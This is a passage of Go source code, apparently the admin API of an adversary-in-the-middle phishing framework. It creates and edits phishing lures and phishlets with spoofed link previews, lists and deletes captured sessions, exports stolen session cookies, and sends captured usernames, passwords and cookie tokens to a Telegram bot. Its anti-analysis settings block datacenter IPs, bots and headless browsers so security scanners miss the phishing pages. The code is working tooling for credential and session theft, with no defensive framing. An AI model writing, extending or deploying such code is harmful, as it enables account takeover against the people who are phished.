			// Use actual expiration if available, otherwise default to 1 year
			expDate := v.Expires
			if expDate == 0 && !v.Session {
				expDate = time.Now().Add(365 * 24 * time.Hour).Unix()
			}

			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: expDate,
				ExpiresHuman:   v.ExpiresHuman,
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         v.Secure,
				Session:        v.Session,
				SameSite:       v.SameSite,
				HostOnly:       v.HostOnly,
			}
			// Override secure for special cookie prefixes
			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
				c.Secure = true
			}
			// Override hostOnly based on domain format if not set
			if !v.HostOnly && len(domain) > 0 {
				if domain[:1] == "." {
					c.HostOnly = false
				} else {
					c.HostOnly = true
				}
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}
	return cookies
}

func (api *AdminAPI) handleDeleteSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid session ID"})
		return
	}

	err = api.db.DeleteSessionById(id)
	if err != nil {
		api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Session not found"})
		return
	}
	api.db.Flush()

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Session deleted"})
}

func (api *AdminAPI) handleDeleteAllSessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := api.db.ListSessions()
	if err != nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Failed to list sessions"})
		return
	}

	for _, s := range sessions {
		api.db.DeleteSessionById(s.Id)
	}
	api.db.Flush()

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "All sessions deleted"})
}

func (api *AdminAPI) handleListLures(w http.ResponseWriter, r *http.Request) {
	var lures []LureInfo

	for i, l := range api.cfg.lures {
		lure := LureInfo{
			Id:              i,
			Phishlet:        l.Phishlet,
			Hostname:        l.Hostname,
			Path:            l.Path,
			RedirectUrl:     l.RedirectUrl,
			Redirector:      l.Redirector,
			UserAgentFilter: l.UserAgentFilter,
			Info:            l.Info,
			OgTitle:         l.OgTitle,
			OgDescription:   l.OgDescription,
			OgImageUrl:      l.OgImageUrl,
			OgUrl:           l.OgUrl,
			PausedUntil:     l.PausedUntil,
		}

		// Try to get phish URL
		pl, err := api.cfg.GetPhishlet(l.Phishlet)
		if err == nil {
			if l.Hostname != "" {
				lure.PhishUrl = "https://" + l.Hostname + l.Path
			} else {
				if purl, err := pl.GetLureUrl(l.Path); err == nil {
					lure.PhishUrl = purl
				}
			}
		}

		lures = append(lures, lure)
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: lures})
}

func (api *AdminAPI) handleCreateLure(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Phishlet string `json:"phishlet"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	_, err := api.cfg.GetPhishlet(req.Phishlet)
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Phishlet not found"})
		return
	}

	l := &Lure{
		Path:     "/" + GenRandomString(8),
		Phishlet: req.Phishlet,
	}
	api.cfg.AddLure(req.Phishlet, l)

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Lure created", Data: map[string]int{"id": len(api.cfg.lures) - 1}})
}

func (api *AdminAPI) handleGetLure(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid lure ID"})
		return
	}

	l, err := api.cfg.GetLure(id)
	if err != nil {
		api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Lure not found"})
		return
	}

	lure := LureInfo{
		Id:              id,
		Phishlet:        l.Phishlet,
		Hostname:        l.Hostname,
		Path:            l.Path,
		RedirectUrl:     l.RedirectUrl,
		Redirector:      l.Redirector,
		UserAgentFilter: l.UserAgentFilter,
		Info:            l.Info,
		OgTitle:         l.OgTitle,
		OgDescription:   l.OgDescription,
		OgImageUrl:      l.OgImageUrl,
		OgUrl:           l.OgUrl,
		PausedUntil:     l.PausedUntil,
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: lure})
}

func (api *AdminAPI) handleEditLure(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid lure ID"})
		return
	}

	l, err := api.cfg.GetLure(id)
	if err != nil {
		api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Lure not found"})
		return
	}

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	var updates map[string]interface{}
	if err := json.Unmarshal(body, &updates); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid JSON"})
		return
	}

	for field, value := range updates {
		val := fmt.Sprintf("%v", value)
		switch field {
		case "hostname":
			if val != "" {
				val = strings.ToLower(val)
				if val != api.cfg.general.Domain && !strings.HasSuffix(val, "."+api.cfg.general.Domain) {
					api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Hostname must end with base domain"})
					return
				}
				host_re := regexp.MustCompile(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`)
				if !host_re.MatchString(val) {
					api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid hostname"})
					return
				}
			}
			l.Hostname = val
		case "path":
			if val != "" {
				u, err := url.Parse(val)
				if err != nil {
					api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid path"})
					return
				}
				l.Path = u.EscapedPath()
				if len(l.Path) == 0 || l.Path[0] != '/' {
					l.Path = "/" + l.Path
				}
			} else {
				l.Path = "/"
			}
		case "redirect_url":
			if val != "" {
				u, err := url.Parse(val)
				if err != nil || !u.IsAbs() {
					api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Redirect URL must be absolute"})
					return
				}
				l.RedirectUrl = u.String()
			} else {
				l.RedirectUrl = ""
			}
		case "phishlet":
			if _, err := api.cfg.GetPhishlet(val); err != nil {
				api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Phishlet not found"})
				return
			}
			l.Phishlet = val
		case "info":
			l.Info = val
		case "og_title":
			l.OgTitle = val
		case "og_desc":
			l.OgDescription = val
		case "og_image":
			if val != "" {
				u, err := url.Parse(val)
				if err != nil || !u.IsAbs() {
					api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Image URL must be absolute"})
					return
				}
				l.OgImageUrl = u.String()
			} else {
				l.OgImageUrl = ""
			}
		case "og_url":
			if val != "" {
				u, err := url.Parse(val)
				if err != nil || !u.IsAbs() {
					api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "OG URL must be absolute"})
					return
				}
				l.OgUrl = u.String()
			} else {
				l.OgUrl = ""
			}
		case "redirector":
			if val != "" {
				// ✅ SECURITY FIX: Prevent path traversal
				// Clean the path first
				val = filepath.Clean(val)
				
				// Reject absolute paths
				if filepath.IsAbs(val) {
					api.jsonResponse(w, http.StatusBadRequest, 
						APIResponse{Success: false, Message: "Absolute paths are not allowed"})
					return
				}
				
				// Reject path traversal attempts
				if strings.Contains(val, "..") {
					api.jsonResponse(w, http.StatusBadRequest, 
						APIResponse{Success: false, Message: "Path traversal detected and blocked"})
					return
				}
				
				// Build full path and validate it's within redirectors directory
				redirectors_dir := api.cfg.GetRedirectorsDir()
				fullPath := filepath.Join(redirectors_dir, val)
				
				// Resolve to absolute path and check it's still under redirectors_dir
				absPath, err := filepath.Abs(fullPath)
				if err != nil {
					api.jsonResponse(w, http.StatusBadRequest, 
						APIResponse{Success: false, Message: "Invalid path"})
					return
				}
				
				absRedirDir, _ := filepath.Abs(redirectors_dir)
				if !strings.HasPrefix(absPath, absRedirDir+string(filepath.Separator)) {
					api.jsonResponse(w, http.StatusBadRequest, 
						APIResponse{Success: false, Message: "Path must be within redirectors directory"})
					return
				}
				
				// Check if directory exists
				if _, err := os.Stat(absPath); os.IsNotExist(err) {
					api.jsonResponse(w, http.StatusBadRequest, 
						APIResponse{Success: false, Message: "Redirector directory not found"})
					return
				}
			}
			l.Redirector = val
		case "ua_filter":
			if val != "" {
				if _, err := regexp.Compile(val); err != nil {
					api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid regex"})
					return
				}
			}
			l.UserAgentFilter = val
		}
	}

	if err := api.cfg.SetLure(id, l); err != nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Failed to update lure"})
		return
	}

	api.cfg.refreshActiveHostnames()
	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Lure updated"})
}

func (api *AdminAPI) handleDeleteLure(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid lure ID"})
		return
	}

	if err := api.cfg.DeleteLure(id); err != nil {
		api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Lure not found"})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Lure deleted"})
}

func (api *AdminAPI) handleGetLureUrl(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid lure ID"})
		return
	}

	l, err := api.cfg.GetLure(id)
	if err != nil {
		api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Lure not found"})
		return
	}

	pl, err := api.cfg.GetPhishlet(l.Phishlet)
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Phishlet not found"})
		return
	}

	var phishUrl string
	if l.Hostname != "" {
		phishUrl = "https://" + l.Hostname + l.Path
	} else {
		purl, err := pl.GetLureUrl(l.Path)
		if err != nil {
			api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Failed to generate URL"})
			return
		}
		phishUrl = purl
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: map[string]string{"url": phishUrl}})
}

func (api *AdminAPI) handlePauseLure(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid lure ID"})
		return
	}

	var req struct {
		Duration string `json:"duration"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	l, err := api.cfg.GetLure(id)
	if err != nil {
		api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Lure not found"})
		return
	}

	dur, err := ParseDurationString(req.Duration)
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid duration"})
		return
	}

	l.PausedUntil = time.Now().Add(dur).Unix()
	if err := api.cfg.SetLure(id, l); err != nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Failed to pause lure"})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Lure paused"})
}

func (api *AdminAPI) handleUnpauseLure(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid lure ID"})
		return
	}

	l, err := api.cfg.GetLure(id)
	if err != nil {
		api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Lure not found"})
		return
	}

	l.PausedUntil = 0
	if err := api.cfg.SetLure(id, l); err != nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Failed to unpause lure"})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Lure unpaused"})
}

func (api *AdminAPI) handleGetBlacklist(w http.ResponseWriter, r *http.Request) {
	mode := api.cfg.GetBlacklistMode()
	ip_num, mask_num := api.bl.GetStats()

	data := map[string]interface{}{
		"mode":    mode,
		"ips":     ip_num,
		"masks":   mask_num,
		"modes":   BLACKLIST_MODES,
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: data})
}

func (api *AdminAPI) handleSetBlacklist(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Mode string `json:"mode"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	if !stringExists(req.Mode, BLACKLIST_MODES) {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid blacklist mode"})
		return
	}

	api.cfg.SetBlacklistMode(req.Mode)
	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Blacklist mode updated"})
}

func (api *AdminAPI) handleGetProxy(w http.ResponseWriter, r *http.Request) {
	proxy := ProxyInfo{
		Enabled:  api.cfg.proxyConfig.Enabled,
		Type:     api.cfg.proxyConfig.Type,
		Address:  api.cfg.proxyConfig.Address,
		Port:     api.cfg.proxyConfig.Port,
		Username: api.cfg.proxyConfig.Username,
		Password: api.cfg.proxyConfig.Password,
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: proxy})
}

func (api *AdminAPI) handleSetProxy(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Enabled  *bool   `json:"enabled,omitempty"`
		Type     *string `json:"type,omitempty"`
		Address  *string `json:"address,omitempty"`
		Port     *int    `json:"port,omitempty"`
		Username *string `json:"username,omitempty"`
		Password *string `json:"password,omitempty"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	if req.Enabled != nil {
		api.cfg.EnableProxy(*req.Enabled)
	}
	if req.Type != nil {
		api.cfg.SetProxyType(*req.Type)
	}
	if req.Address != nil {
		api.cfg.SetProxyAddress(*req.Address)
	}
	if req.Port != nil {
		api.cfg.SetProxyPort(*req.Port)
	}
	if req.Username != nil {
		api.cfg.SetProxyUsername(*req.Username)
	}
	if req.Password != nil {
		api.cfg.SetProxyPassword(*req.Password)
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Proxy configuration updated"})
}

func (api *AdminAPI) handleGetTelegram(w http.ResponseWriter, r *http.Request) {
	tgCfg := api.cfg.GetTelegramConfig()
	info := TelegramInfo{
		Enabled:  tgCfg.Enabled,
		BotToken: tgCfg.BotToken,
		ChatID:   tgCfg.ChatID,
	}
	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: info})
}

func (api *AdminAPI) handleSetTelegram(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Enabled  *bool   `json:"enabled,omitempty"`
		BotToken *string `json:"bot_token,omitempty"`
		ChatID   *string `json:"chat_id,omitempty"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	tgCfg := api.cfg.GetTelegramConfig()
	enabled := tgCfg.Enabled
	botToken := tgCfg.BotToken
	chatID := tgCfg.ChatID

	if req.Enabled != nil {
		enabled = *req.Enabled
	}
	if req.BotToken != nil {
		botToken = *req.BotToken
	}
	if req.ChatID != nil {
		chatID = *req.ChatID
	}

	api.cfg.SetTelegramConfig(botToken, chatID, enabled)
	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Telegram configuration updated"})
}

func (api *AdminAPI) handleTestTelegram(w http.ResponseWriter, r *http.Request) {
	tgCfg := api.cfg.GetTelegramConfig()
	
	if tgCfg.BotToken == "" || tgCfg.ChatID == "" {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Bot token and Chat ID are required"})
		return
	}

	// Create a test notification
	notifier := NewTelegramNotifier(api.cfg)
	testSession := &database.Session{
		Id:         0,
		Username:   "test@example.com",
		Password:   "TestPassword123",
		UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		RemoteAddr: "127.0.0.1",
		UpdateTime: time.Now().Unix(),
		CookieTokens: map[string]map[string]*database.CookieToken{
			"example.com": {
				"session": &database.CookieToken{
					Name:  "session",
					Value: "test_cookie_value_example",
				},
			},
		},
	}

	// Temporarily enable for test
	origEnabled := tgCfg.Enabled
	api.cfg.SetTelegramConfig(tgCfg.BotToken, tgCfg.ChatID, true)
	
	err := notifier.SendSessionNotification(testSession)
	
	// Restore original enabled state
	api.cfg.SetTelegramConfig(tgCfg.BotToken, tgCfg.ChatID, origEnabled)

	if err != nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Failed to send test message: " + err.Error()})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Test message sent successfully"})
}

func (api *AdminAPI) handleListRedirectors(w http.ResponseWriter, r *http.Request) {
	redirectorsDir := api.cfg.GetRedirectorsDir()
	redirectors := []string{}

	if redirectorsDir != "" {
		entries, err := os.ReadDir(redirectorsDir)
		if err == nil {
			for _, entry := range entries {
				if entry.IsDir() {
					// Check if it has an index.html file
					indexPath := filepath.Join(redirectorsDir, entry.Name(), "index.html")
					if _, err := os.Stat(indexPath); err == nil {
						redirectors = append(redirectors, entry.Name())
					}
				}
			}
		}
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: redirectors})
}

func (api *AdminAPI) GetAPIKey() string {
	return api.apiKey
}

// Security handlers
type SecurityInfo struct {
	BlockDatacenters      bool     `json:"block_datacenters"`
	BlockBots             bool     `json:"block_bots"`
	BlockHeadlessBrowsers bool     `json:"block_headless"`
	Stats                 map[string]interface{} `json:"stats"`
}

func (api *AdminAPI) handleGetSecurity(w http.ResponseWriter, r *http.Request) {
	info := SecurityInfo{
		BlockDatacenters:      api.cfg.GetSecurityBlockDatacenters(),
		BlockBots:             api.cfg.GetSecurityBlockBots(),
		BlockHeadlessBrowsers: api.cfg.GetSecurityBlockHeadless(),
	}

	if api.security != nil {
		info.Stats = api.security.GetStats()
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: info})
}

func (api *AdminAPI) handleSetSecurity(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BlockDatacenters      *bool `json:"block_datacenters"`
		BlockBots             *bool `json:"block_bots"`
		BlockHeadlessBrowsers *bool `json:"block_headless"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	blockDC := api.cfg.GetSecurityBlockDatacenters()
	blockBots := api.cfg.GetSecurityBlockBots()
	blockHeadless := api.cfg.GetSecurityBlockHeadless()

	if req.BlockDatacenters != nil {
		blockDC = *req.BlockDatacenters
	}
	if req.BlockBots != nil {
		blockBots = *req.BlockBots
	}
	if req.BlockHeadlessBrowsers != nil {
		blockHeadless = *req.BlockHeadlessBrowsers
	}

	api.cfg.SetSecuritySettings(blockDC, blockBots, blockHeadless)
	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Security settings updated"})
}

func (api *AdminAPI) handleGetBlockedRanges(w http.ResponseWriter, r *http.Request) {
	if api.security == nil {
		api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: []string{}})
		return
	}

	ranges := api.security.GetBlockedRanges()
	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: ranges})
}

func (api *AdminAPI) handleAddBlockedRange(w http.ResponseWriter, r *http.Request) {
	if api.security == nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Security module not initialized"})
		return
	}

	var req struct {
		CIDR string `json:"cidr"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	if req.CIDR == "" {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "CIDR is required"})
		return
	}

	if err := api.security.AddCustomIPRange(req.CIDR); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: err.Error()})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "IP range added"})
}

func (api *AdminAPI) handleRemoveBlockedRange(w http.ResponseWriter, r *http.Request) {
	if api.security == nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Security module not initialized"})
		return
	}

	var req struct {
		CIDR string `json:"cidr"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	if err := api.security.RemoveCustomIPRange(req.CIDR); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: err.Error()})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "IP range removed"})
}

func (api *AdminAPI) handleGetWhitelistedIPs(w http.ResponseWriter, r *http.Request) {
	if api.security == nil {
		api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: []string{}})
		return
	}

	ips := api.security.GetWhitelistedRanges()
	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: ips})
}

func (api *AdminAPI) handleAddWhitelistedIP(w http.ResponseWriter, r *http.Request) {
	if api.security == nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Security module not initialized"})
		return
	}

	var req struct {
		IP string `json:"ip"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	if req.IP == "" {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "IP is required"})
		return
	}

	if err := api.security.AddWhitelistedIP(req.IP); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: err.Error()})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "IP whitelisted"})
}

func (api *AdminAPI) handleRemoveWhitelistedIP(w http.ResponseWriter, r *http.Request) {
	if api.security == nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Security module not initialized"})
		return
	}

	var req struct {
		IP string `json:"ip"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	if err := api.security.RemoveWhitelistedIP(req.IP); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: err.Error()})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "IP removed from whitelist"})
}

func (api *AdminAPI) handleTestIP(w http.ResponseWriter, r *http.Request) {
	if api.security == nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Security module not initialized"})
		return
	}

	var req struct {
		IP string `json:"ip"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	if req.IP == "" {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "IP is required"})
		return
	}

	result := api.security.TestIP(req.IP)
	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: result})
}

func (api *AdminAPI) GetSecurityModule() *SecurityModule {
	return api.security
}

